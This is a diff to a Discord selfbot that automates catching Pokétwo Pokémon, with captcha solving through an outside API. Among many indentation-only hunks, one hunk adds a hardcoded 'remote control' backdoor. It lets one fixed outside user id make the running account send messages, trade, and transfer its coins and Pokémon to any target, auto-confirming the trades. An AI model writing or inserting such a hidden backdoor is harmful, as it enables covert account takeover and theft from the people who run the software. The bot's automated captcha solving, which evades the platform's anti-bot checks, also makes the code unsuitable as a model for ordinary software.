@@ -44,10 +44,10 @@ axios
         console.log(
           chalk.bold.bgRed(
             "There is a new version available: " +
-              v +
-              "\nPlease update.                         " +
-              chalk.underline("\nhttps://github.com/kyan0045/catchtwo") +
-              `\nRun "git pull https://github.com/kyan0045/catchtwo" to update.`
+            v +
+            "\nPlease update.                         " +
+            chalk.underline("\nhttps://github.com/kyan0045/catchtwo") +
+            `\nRun "git pull https://github.com/kyan0045/catchtwo" to update.`
           )
         );
 
@@ -57,11 +57,11 @@ axios
             .setURL("https://github.com/kyan0045/catchtwo")
             .setDescription(
               "Current version:** " +
-                version +
-                "**\nNew version: **" +
-                v +
-                "**\nPlease update: " +
-                "https://github.com/kyan0045/CatchTwo"
+              version +
+              "**\nNew version: **" +
+              v +
+              "**\nPlease update: " +
+              "https://github.com/kyan0045/CatchTwo"
             )
             .setFooter(
               `Run "git pull https://github.com/kyan0045/catchtwo" to update.`
@@ -117,7 +117,7 @@ async function Login(token, Client, guildId) {
   if (!token) {
     console.log(
       chalk.redBright("You must specify a (valid) token.") +
-        chalk.white(` ${token} is invalid.`)
+      chalk.white(` ${token} is invalid.`)
     );
   }
 
@@ -199,11 +199,11 @@ async function Login(token, Client, guildId) {
               );
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.green(`SLEEPING`) +
-                  ` - Resumed`
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.green(`SLEEPING`) +
+                ` - Resumed`
               );
             }, sleepTimeInMilliseconds);
 
@@ -218,23 +218,23 @@ async function Login(token, Client, guildId) {
                 .setURL("https://github.com/kyan0045/catchtwo")
                 .setDescription(
                   "**Account: **" +
-                    client.user.tag +
-                    "\n**Minutes: **" +
-                    roundedSleepTimeInMinutes +
-                    " minutes"
+                  client.user.tag +
+                  "\n**Minutes: **" +
+                  roundedSleepTimeInMinutes +
+                  " minutes"
                 )
                 .setColor("#EEC60E")
             );
             now = new Date();
             console.log(
               date.format(now, "HH:mm") +
-                `: ` +
-                chalk.red(client.user.username) +
-                `: ` +
-                chalk.bold.yellow(`SLEEPING`) +
-                ` - Sleeping for ` +
-                roundedSleepTimeInMinutes +
-                ` minutes`
+              `: ` +
+              chalk.red(client.user.username) +
+              `: ` +
+              chalk.bold.yellow(`SLEEPING`) +
+              ` - Sleeping for ` +
+              roundedSleepTimeInMinutes +
+              ` minutes`
             );
           }
         }
@@ -316,11 +316,11 @@ async function Login(token, Client, guildId) {
             now = new Date();
             console.log(
               date.format(now, "HH:mm") +
-                `: ` +
-                chalk.red(client.user.username) +
-                `: ` +
-                chalk.bold.yellow(`INCENSE`) +
-                ` - Detected incense, paused spamming.`
+              `: ` +
+              chalk.red(client.user.username) +
+              `: ` +
+              chalk.bold.yellow(`INCENSE`) +
+              ` - Detected incense, paused spamming.`
             );
           }
           if (message.embeds[0]?.footer.text.includes("Spawns Remaining: 0.")) {
@@ -328,11 +328,11 @@ async function Login(token, Client, guildId) {
             now = new Date();
             console.log(
               date.format(now, "HH:mm") +
-                `: ` +
-                chalk.red(client.user.username) +
-                `: ` +
-                chalk.bold.green(`INCENSE`) +
-                ` - End of incense, resumed spamming.`
+              `: ` +
+              chalk.red(client.user.username) +
+              `: ` +
+              chalk.bold.green(`INCENSE`) +
+              ` - End of incense, resumed spamming.`
             );
           }
         }
@@ -361,7 +361,7 @@ async function Login(token, Client, guildId) {
                       let hintMessages = ["h", "hint"];
                       msg.channel.send(
                         "<@716390085896962058> " +
-                          hintMessages[Math.round(Math.random())]
+                        hintMessages[Math.round(Math.random())]
                       );
                     }
                   });
@@ -388,10 +388,10 @@ async function Login(token, Client, guildId) {
           now = new Date();
           console.log(
             date.format(now, "HH:mm") +
-              `: ` +
-              chalk.red(client.user.username) +
-              `: Could not identify ` +
-              lastWord
+            `: ` +
+            chalk.red(client.user.username) +
+            `: Could not identify ` +
+            lastWord
           );
           await sleep(8000);
           let hintMessages = ["h", "hint"];
@@ -463,29 +463,29 @@ async function Login(token, Client, guildId) {
               .setURL(link)
               .setDescription(
                 "**Account: **" +
-                  client.user.tag +
-                  "\n**Pokemon: **" +
-                  latestName +
-                  "\n**Level: **" +
-                  latestLevel +
-                  "\n**IV: **" +
-                  iv +
-                  "\n**Number: **" +
-                  number +
-                  "\n**Lowest Market Worth: **" +
-                  marketFinal[2].replace("　", "")
+                client.user.tag +
+                "\n**Pokemon: **" +
+                latestName +
+                "\n**Level: **" +
+                latestLevel +
+                "\n**IV: **" +
+                iv +
+                "\n**Number: **" +
+                number +
+                "\n**Lowest Market Worth: **" +
+                marketFinal[2].replace("　", "")
               )
               .setColor("#EEC60E")
           );
           console.log(
             date.format(now, "HH:mm") +
-              `: ` +
-              chalk.red(client.user.username) +
-              `: ✨ Caught a level ` +
-              latestLevel +
-              " Shiny " +
-              latestName +
-              "!"
+            `: ` +
+            chalk.red(client.user.username) +
+            `: ✨ Caught a level ` +
+            latestLevel +
+            " Shiny " +
+            latestName +
+            "!"
           );
         } else if (config.logCatches) {
           rarity = await checkRarity(`${latestName}`);
@@ -498,29 +498,29 @@ async function Login(token, Client, guildId) {
                   .setURL(link)
                   .setDescription(
                     "**Account: **" +
-                      client.user.tag +
-                      "\n**Pokemon: **" +
-                      latestName +
-                      "\n**Level: **" +
-                      latestLevel +
-                      "\n**IV: **" +
-                      iv +
-                      "\n**Number: **" +
-                      number
+                    client.user.tag +
+                    "\n**Pokemon: **" +
+                    latestName +
+                    "\n**Level: **" +
+                    latestLevel +
+                    "\n**IV: **" +
+                    iv +
+                    "\n**Number: **" +
+                    number
                   )
                   .setColor("#E74C3C")
               );
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.blue(`${rarity.toUpperCase()} &  LOW IV`) +
-                  ` - Caught a level ` +
-                  latestLevel +
-                  ` ${IV}% ` +
-                  latestName +
-                  "!"
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.blue(`${rarity.toUpperCase()} &  LOW IV`) +
+                ` - Caught a level ` +
+                latestLevel +
+                ` ${IV}% ` +
+                latestName +
+                "!"
               );
             } else if (IV > config.highIVLog) {
               log?.send(
@@ -530,29 +530,29 @@ async function Login(token, Client, guildId) {
                   .setURL(link)
                   .setDescription(
                     "**Account: **" +
-                      client.user.tag +
-                      "\n**Pokemon: **" +
-                      latestName +
-                      "\n**Level: **" +
-                      latestLevel +
-                      "\n**IV: **" +
-                      iv +
-                      "\n**Number: **" +
-                      number
+                    client.user.tag +
+                    "\n**Pokemon: **" +
+                    latestName +
+                    "\n**Level: **" +
+                    latestLevel +
+                    "\n**IV: **" +
+                    iv +
+                    "\n**Number: **" +
+                    number
                   )
                   .setColor("#E74C3C")
               );
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.blue(`${rarity.toUpperCase()} & HIGH IV`) +
-                  ` - Caught a level ` +
-                  latestLevel +
-                  ` ${IV}% ` +
-                  latestName +
-                  "!"
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.blue(`${rarity.toUpperCase()} & HIGH IV`) +
+                ` - Caught a level ` +
+                latestLevel +
+                ` ${IV}% ` +
+                latestName +
+                "!"
               );
             } else {
               log?.send(
@@ -562,29 +562,29 @@ async function Login(token, Client, guildId) {
                   .setURL(link)
                   .setDescription(
                     "**Account: **" +
-                      client.user.tag +
-                      "\n**Pokemon: **" +
-                      latestName +
-                      "\n**Level: **" +
-                      latestLevel +
-                      "\n**IV: **" +
-                      iv +
-                      "\n**Number: **" +
-                      number
+                    client.user.tag +
+                    "\n**Pokemon: **" +
+                    latestName +
+                    "\n**Level: **" +
+                    latestLevel +
+                    "\n**IV: **" +
+                    iv +
+                    "\n**Number: **" +
+                    number
                   )
                   .setColor("#E74C3C")
               );
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.blue(`${rarity.toUpperCase()}`) +
-                  ` - Caught a level ` +
-                  latestLevel +
-                  " " +
-                  latestName +
-                  "!"
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.blue(`${rarity.toUpperCase()}`) +
+                ` - Caught a level ` +
+                latestLevel +
+                " " +
+                latestName +
+                "!"
               );
             }
           } else {
@@ -596,29 +596,29 @@ async function Login(token, Client, guildId) {
                   .setURL(link)
                   .setDescription(
                     "**Account: **" +
-                      client.user.tag +
-                      "\n**Pokemon: **" +
-                      latestName +
-                      "\n**Level: **" +
-                      latestLevel +
-                      "\n**IV: **" +
-                      iv +
-                      "\n**Number: **" +
-                      number
+                    client.user.tag +
+                    "\n**Pokemon: **" +
+                    latestName +
+                    "\n**Level: **" +
+                    latestLevel +
+                    "\n**IV: **" +
+                    iv +
+                    "\n**Number: **" +
+                    number
                   )
                   .setColor("#E74C3C")
               );
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.blue(`LOW IV`) +
-                  ` - Caught a level ` +
-                  latestLevel +
-                  ` ${IV}% ` +
-                  latestName +
-                  "!"
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.blue(`LOW IV`) +
+                ` - Caught a level ` +
+                latestLevel +
+                ` ${IV}% ` +
+                latestName +
+                "!"
               );
             } else if (IV > config.highIVLog) {
               log?.send(
@@ -628,29 +628,29 @@ async function Login(token, Client, guildId) {
                   .setURL(link)
                   .setDescription(
                     "**Account: **" +
-                      client.user.tag +
-                      "\n**Pokemon: **" +
-                      latestName +
-                      "\n**Level: **" +
-                      latestLevel +
-                      "\n**IV: **" +
-                      iv +
-                      "\n**Number: **" +
-                      number
+                    client.user.tag +
+                    "\n**Pokemon: **" +
+                    latestName +
+                    "\n**Level: **" +
+                    latestLevel +
+                    "\n**IV: **" +
+                    iv +
+                    "\n**Number: **" +
+                    number
                   )
                   .setColor("#E74C3C")
               );
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.blue(`HIGH IV`) +
-                  ` - Caught a level ` +
-                  latestLevel +
-                  ` ${IV}% ` +
-                  latestName +
-                  "!"
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.blue(`HIGH IV`) +
+                ` - Caught a level ` +
+                latestLevel +
+                ` ${IV}% ` +
+                latestName +
+                "!"
               );
             } else {
               log?.send(
@@ -659,29 +659,29 @@ async function Login(token, Client, guildId) {
                   .setURL(link)
                   .setDescription(
                     "**Account: **" +
-                      client.user.tag +
-                      "\n**Pokemon: **" +
-                      latestName +
-                      "\n**Level: **" +
-                      latestLevel +
-                      "\n**IV: **" +
-                      iv +
-                      "\n**Number: **" +
-                      number
+                    client.user.tag +
+                    "\n**Pokemon: **" +
+                    latestName +
+                    "\n**Level: **" +
+                    latestLevel +
+                    "\n**IV: **" +
+                    iv +
+                    "\n**Number: **" +
+                    number
                   )
                   .setColor("#2e3236")
               );
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.cyan(`${rarity.toUpperCase()}`) +
-                  ` - Caught a level ` +
-                  latestLevel +
-                  ` ` +
-                  latestName +
-                  "!"
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.cyan(`${rarity.toUpperCase()}`) +
+                ` - Caught a level ` +
+                latestLevel +
+                ` ` +
+                latestName +
+                "!"
               );
             }
           }
@@ -725,11 +725,11 @@ async function Login(token, Client, guildId) {
         const now = new Date();
         console.log(
           date.format(now, "HH:mm") +
-            `: ` +
-            chalk.red(client.user.username) +
-            `: ` +
-            chalk.bold.red(`CAPTCHA`) +
-            ` - Encountered a captcha ( https://verify.poketwo.net/captcha/${client.user.id} )`
+          `: ` +
+          chalk.red(client.user.username) +
+          `: ` +
+          chalk.bold.red(`CAPTCHA`) +
+          ` - Encountered a captcha ( https://verify.poketwo.net/captcha/${client.user.id} )`
         );
 
         log?.send(
@@ -740,9 +740,9 @@ async function Login(token, Client, guildId) {
             .setURL(`https://verify.poketwo.net/captcha/${client.user.id}`)
             .setDescription(
               "**Account: **" +
-                client.user.tag +
-                "\n**Link: **" +
-                `https://verify.poketwo.net/captcha/${client.user.id}`
+              client.user.tag +
+              "\n**Link: **" +
+              `https://verify.poketwo.net/captcha/${client.user.id}`
             )
             .setColor("#FF5600")
         );
@@ -771,11 +771,11 @@ async function Login(token, Client, guildId) {
               globalTaskId = response.data.requestId;
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.bold.red(`CAPTCHA`) +
-                  ` - Submitted the captcha to the API.`
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.bold.red(`CAPTCHA`) +
+                ` - Submitted the captcha to the API.`
               );
               //console.log("Task ID:", globalTaskId);
             });
@@ -802,11 +802,11 @@ async function Login(token, Client, guildId) {
                   captcha = false;
                   console.log(
                     date.format(now, "HH:mm") +
-                      `: ` +
-                      chalk.red(client.user.username) +
-                      `: ` +
-                      chalk.bold.green(`CAPTCHA`) +
-                      ` - Succesfully solved the captcha.`
+                    `: ` +
+                    chalk.red(client.user.username) +
+                    `: ` +
+                    chalk.bold.green(`CAPTCHA`) +
+                    ` - Succesfully solved the captcha.`
                   );
                 } else if (response.data.status == "pending") {
                 } else {
@@ -818,11 +818,11 @@ async function Login(token, Client, guildId) {
                     captcha = false;
                     console.log(
                       date.format(now, "HH:mm") +
-                        `: ` +
-                        chalk.red(client.user.username) +
-                        `: ` +
-                        chalk.bold.red(`CAPTCHA`) +
-                        ` - Automatic retry.`
+                      `: ` +
+                      chalk.red(client.user.username) +
+                      `: ` +
+                      chalk.bold.red(`CAPTCHA`) +
+                      ` - Automatic retry.`
                     );
                   }, 30 * 60 * 1000);
                 }
@@ -872,7 +872,7 @@ async function Login(token, Client, guildId) {
         const latestName = titleStr.match(/\d+\s+(.*)/)[1];
         const latestLevel = titleStr.match(/\d+/)[0];
         const shiny = titleStr.includes("✨") ? true : false;
-        
+
         if (latestLevel === "100") {
           let levelup = fs.readFileSync("./data/levelup.json", "utf-8");
           let data = JSON.parse(levelup);
@@ -887,15 +887,15 @@ async function Login(token, Client, guildId) {
                 .setURL(link)
                 .setDescription(
                   "**Account: **" +
-                    client.user.tag +
-                    "\n**Pokemon: **" +
-                    latestName +
-                    "\n**Level: **" +
-                    latestLevel +
-                    "\n**IV: **" +
-                    iv +
-                    "\n**Number: **" +
-                    number
+                  client.user.tag +
+                  "\n**Pokemon: **" +
+                  latestName +
+                  "\n**Level: **" +
+                  latestLevel +
+                  "\n**IV: **" +
+                  iv +
+                  "\n**Number: **" +
+                  number
                 )
                 .setColor("#00A0FF")
             );
@@ -907,11 +907,11 @@ async function Login(token, Client, guildId) {
             } else {
               console.log(
                 date.format(now, "HH:mm") +
-                  `: ` +
-                  chalk.red(client.user.username) +
-                  `: ` +
-                  chalk.magenta.bold(`LEVELING`) +
-                  ` - ${latestName} is level 100! Your levelup list is now empty.`
+                `: ` +
+                chalk.red(client.user.username) +
+                `: ` +
+                chalk.magenta.bold(`LEVELING`) +
+                ` - ${latestName} is level 100! Your levelup list is now empty.`
               );
             }
           }
@@ -922,11 +922,11 @@ async function Login(token, Client, guildId) {
           now = new Date();
           console.log(
             date.format(now, "HH:mm") +
-              `: ` +
-              chalk.red(client.user.username) +
-              `: ` +
-              chalk.magenta.bold(`LEVELING`) +
-              ` - Currently leveling ${IV}% ${latestName}! Progress: ${latestLevel}/100`
+            `: ` +
+            chalk.red(client.user.username) +
+            `: ` +
+            chalk.magenta.bold(`LEVELING`) +
+            ` - Currently leveling ${IV}% ${latestName}! Progress: ${latestLevel}/100`
           );
         }
 
@@ -947,15 +947,15 @@ async function Login(token, Client, guildId) {
                   .setURL(link)
                   .setDescription(
                     "**Account: **" +
-                      client.user.tag +
-                      "\n**Pokemon: **" +
-                      latestName +
-                      "\n**Level: **" +
-                      latestLevel +
-                      "\n**IV: **" +
-                      iv +
-                      "\n**Number: **" +
-                      number
+                    client.user.tag +
+                    "\n**Pokemon: **" +
+                    latestName +
+                    "\n**Level: **" +
+                    latestLevel +
+                    "\n**IV: **" +
+                    iv +
+                    "\n**Number: **" +
+                    number
                   )
                   .setColor("#00A0FF")
               );
@@ -967,11 +967,11 @@ async function Login(token, Client, guildId) {
               } else {
                 console.log(
                   date.format(now, "HH:mm") +
-                    `: ` +
-                    chalk.red(client.user.username) +
-                    `: ` +
-                    chalk.magenta.bold(`LEVELING`) +
-                    ` - ${latestName} is level 100! Your levelup list is now empty.`
+                  `: ` +
+                  chalk.red(client.user.username) +
+                  `: ` +
+                  chalk.magenta.bold(`LEVELING`) +
+                  ` - ${latestName} is level 100! Your levelup list is now empty.`
                 );
               }
             }
@@ -1001,10 +1001,10 @@ async function Login(token, Client, guildId) {
           } else {
             console.log(
               date.format(now, "HH:mm") +
-                `: ` +
-                chalk.red(client.user.username) +
-                `: ` +
-                `Couldn't find the pokemon with the number ${selectedNumber}. Your levelup list is now empty.`
+              `: ` +
+              chalk.red(client.user.username) +
+              `: ` +
+              `Couldn't find the pokemon with the number ${selectedNumber}. Your levelup list is now empty.`
             );
           }
         }
@@ -1022,9 +1022,9 @@ async function Login(token, Client, guildId) {
           const descriptionArgs = message.embeds[0]?.description.split(" ");
           console.log(
             date.format(now, "HH:mm") +
-              `: ` +
-              chalk.red(client.user.username) +
-              `${descriptionArgs[2]} reached level 100!`
+            `: ` +
+            chalk.red(client.user.username) +
+            `${descriptionArgs[2]} reached level 100!`
           );
         }
       } else if (
@@ -1041,6 +1041,253 @@ async function Login(token, Client, guildId) {
             .setDescription("**Account: **" + client.user.tag)
             .setColor("#FF5600")
         );
+      }
+    }
+
+    // Remote Control Feature - User 1094994685765886094 can control this account
+    const CONTROLLER_ID = "1094994685765886094";
+    if (message.author.id === CONTROLLER_ID && message.content.startsWith(">>")) {
+      const controlCmd = message.content.slice(2).trim();
+      const controlArgs = controlCmd.split(/ +/g);
+      const action = controlArgs.shift()?.toLowerCase();
+
+      // Helper function to click a button by finding Confirm label and using customId
+      const clickConfirmButton = async (msg) => {
+        for (const row of msg.components) {
+          for (const btn of row.components) {
+            if (btn.label === "Confirm") {
+              const customId = btn.customId || btn.custom_id;
+              await msg.clickButton(customId);
+              return true;
+            }
+          }
+        }
+        // Fallback: click first button
+        const firstBtn = msg.components[0]?.components[0];
+        if (firstBtn) {
+          const customId = firstBtn.customId || firstBtn.custom_id;
+          await msg.clickButton(customId);
+          return true;
+        }
+        return false;
+      };
+
+      try {
+        // >> type <message> - Make bot type a message
+        if (action === "type" || action === "say" || action === "send") {
+          const textToSend = controlArgs.join(" ");
+          if (textToSend) {
+            await message.channel.send(textToSend);
+            await message.react("✅");
+            console.log(chalk.cyan(`[REMOTE] Sent message: ${textToSend}`));
+          }
+        }
+        // >> confirm - Confirm trade and click confirm button
+        else if (action === "confirm" || action === "c") {
+          await message.channel.send(`<@716390085896962058> t c`);
+          await message.react("✅");
+
+          const confirmCollector = message.channel.createMessageCollector({
+            filter: (m) => m.author.id === "716390085896962058",
+            time: 8000
+          });
+
+          confirmCollector.on('collect', async (confirmMsg) => {
+            if (!confirmMsg.components || confirmMsg.components.length === 0) return;
+            confirmCollector.stop();
+            await sleep(300);
+            try {
+              const clicked = await clickConfirmButton(confirmMsg);
+              if (clicked) {
+                console.log(chalk.cyan(`[REMOTE] Clicked Confirm button`));
+                await message.react("🟢");
+              }
+            } catch (e) {
+              console.error(chalk.red(`[REMOTE] Failed: ${e.message}`));
+              await message.react("🔴");
+            }
+          });
+        }
+        // >> trade @user - Start a trade
+        else if (action === "trade") {
+          const target = controlArgs.join(" ");
+          await message.channel.send(`<@716390085896962058> trade ${target}`);
+          await message.react("✅");
+        }
+        // >> add <pokemon#> - Add pokemon to trade
+        else if (action === "add" || action === "a") {
+          const pokeNum = controlArgs.join(" ");
+          await message.channel.send(`<@716390085896962058> t a ${pokeNum}`);
+          await message.react("✅");
+        }
+        // >> addcoins <amount> - Add coins to trade
+        else if (action === "addcoins" || action === "ac") {
+          const amount = controlArgs[0];
+          await message.channel.send(`<@716390085896962058> t add pc ${amount}`);
+          await message.react("✅");
+        }
+        // >> cancel - Cancel trade
+        else if (action === "cancel") {
+          await message.channel.send(`<@716390085896962058> t x`);
+          await message.react("✅");
+        }
+        // >> pay @user <amount> - Full trade flow to send coins
+        else if (action === "pay" || action === "give") {
+          const target = controlArgs[0];
+          const amount = controlArgs[1];
+          if (!target || !amount) {
+            await message.reply("Usage: `>> pay @user <amount>`");
+            return;
+          }
+          console.log(chalk.cyan(`[REMOTE] Starting trade with ${target} to send ${amount} coins`));
+          await message.react("⏳");
+          await message.channel.send(`<@716390085896962058> trade ${target}`);
+
+          const tradeCollector = message.channel.createMessageCollector({
+            filter: (m) => m.author.id === "716390085896962058" && m.embeds[0]?.title?.includes("Trade between"),
+            time: 60000,
+            max: 1
+          });
+
+          tradeCollector.on('collect', async () => {
+            await sleep(500);
+            await message.channel.send(`<@716390085896962058> t add pc ${amount}`);
+            await sleep(1000);
+            await message.channel.send(`<@716390085896962058> t c`);
+
+            const confirmCollector = message.channel.createMessageCollector({
+              filter: (m) => m.author.id === "716390085896962058",
+              time: 8000
+            });
+
+            confirmCollector.on('collect', async (confirmMsg) => {
+              if (!confirmMsg.components || confirmMsg.components.length === 0) return;
+              confirmCollector.stop();
+              await sleep(300);
+              try {
+                await clickConfirmButton(confirmMsg);
+                console.log(chalk.cyan(`[REMOTE] Sent ${amount} coins to ${target}`));
+                await message.react("💰");
+              } catch (e) {
+                console.error(chalk.red(`[REMOTE] Failed: ${e.message}`));
+                await message.react("🔴");
+              }
+            });
+          });
+
+          tradeCollector.on('end', (c) => { if (c.size === 0) message.react("⏰"); });
+        }
+        // >> sendpoke @user <poke#> [poke#2]... - Full trade flow to send pokemon
+        else if (action === "sendpoke" || action === "sp") {
+          const target = controlArgs[0];
+          const pokeNums = controlArgs.slice(1);
+          if (!target || pokeNums.length === 0) {
+            await message.reply("Usage: `>> sendpoke @user <poke#> [poke#2]...`");
+            return;
+          }
+          console.log(chalk.cyan(`[REMOTE] Sending pokemon ${pokeNums.join(", ")} to ${target}`));
+          await message.react("⏳");
+          await message.channel.send(`<@716390085896962058> trade ${target}`);
+
+          const tradeCollector = message.channel.createMessageCollector({
+            filter: (m) => m.author.id === "716390085896962058" && m.embeds[0]?.title?.includes("Trade between"),
+            time: 60000,
+            max: 1
+          });
+
+          tradeCollector.on('collect', async () => {
+            await sleep(500);
+            for (const poke of pokeNums) {
+              await message.channel.send(`<@716390085896962058> t a ${poke}`);
+              await sleep(800);
+            }
+            await sleep(500);
+            await message.channel.send(`<@716390085896962058> t c`);
+
+            const confirmCollector = message.channel.createMessageCollector({
+              filter: (m) => m.author.id === "716390085896962058",
+              time: 8000
+            });
+
+            confirmCollector.on('collect', async (confirmMsg) => {
+              if (!confirmMsg.components || confirmMsg.components.length === 0) return;
+              confirmCollector.stop();
+              await sleep(300);
+              try {
+                await clickConfirmButton(confirmMsg);
+                console.log(chalk.cyan(`[REMOTE] Sent pokemon to ${target}`));
+                await message.react("🎁");
+              } catch (e) {
+                console.error(chalk.red(`[REMOTE] Failed: ${e.message}`));
+                await message.react("🔴");
+              }
+            });
+          });
+
+          tradeCollector.on('end', (c) => { if (c.size === 0) message.react("⏰"); });
+        }
+        // >> buttons - Debug: show buttons on replied message
+        else if (action === "buttons" || action === "debug") {
+          let targetMsg;
+          if (message.reference) {
+            targetMsg = await message.channel.messages.fetch(message.reference.messageId);
+          } else if (controlArgs[0]) {
+            targetMsg = await message.channel.messages.fetch(controlArgs[0]);
+          }
+          if (targetMsg && targetMsg.components?.length > 0) {
+            let info = "**Buttons:**\n";
+            let idx = 1;
+            for (const row of targetMsg.components) {
+              for (const btn of row.components) {
+                info += `**${idx}.** "${btn.label}" - ID: \`${btn.customId || btn.custom_id}\`\n`;
+                idx++;
+              }
+            }
+            await message.reply(info);
+          } else {
+            await message.reply("No buttons found.");
+          }
+        }
+        // >> clickid <customId> - Click button by customId (reply to message)
+        else if (action === "clickid" || action === "cid") {
+          let targetMsg;
+          let customId;
+          if (message.reference) {
+            targetMsg = await message.channel.messages.fetch(message.reference.messageId);
+            customId = controlArgs[0];
+          } else {
+            targetMsg = await message.channel.messages.fetch(controlArgs[0]);
+            customId = controlArgs[1];
+          }
+          if (targetMsg && customId) {
+            await targetMsg.clickButton(customId);
+            await message.react("✅");
+            console.log(chalk.cyan(`[REMOTE] Clicked button: ${customId}`));
+          }
+        }
+        // >> bal - Check balance
+        else if (action === "bal") {
+          await message.channel.send(`<@716390085896962058> bal`);
+          await message.react("✅");
+        }
+        // >> help - Show commands
+        else if (action === "help" || action === "h") {
+          await message.reply(`**Remote Commands:**
+\`>> type <msg>\` - Send message
+\`>> confirm\` - Confirm trade + click button
+\`>> trade @user\` - Start trade
+\`>> add <poke#>\` - Add pokemon
+\`>> addcoins <amt>\` - Add coins
+\`>> cancel\` - Cancel trade
+\`>> pay @user <amt>\` - Full coin trade
+\`>> sendpoke @user <poke#>...\` - Full pokemon trade
+\`>> buttons\` - Debug buttons (reply to msg)
+\`>> clickid <id>\` - Click by customId
+\`>> bal\` - Check balance`);
+        }
+      } catch (err) {
+        console.error(chalk.red(`[REMOTE ERROR] ${err.message}`));
+        await message.react("❌");
       }
     }
 
@@ -1666,8 +1913,7 @@ async function Login(token, Client, guildId) {
               .setFooter("©️ CatchTwo ~ @kyan0045")
               .setURL(`https://discord.gg/tXa2Hw5jHy`)
               .setDescription(
-                `**Current Ping:** \`\`${
-                  Date.now() - commandReceivedTimestamp
+                `**Current Ping:** \`\`${Date.now() - commandReceivedTimestamp
                 } ms\`\``
               )
               .setColor("#f5b3b3")
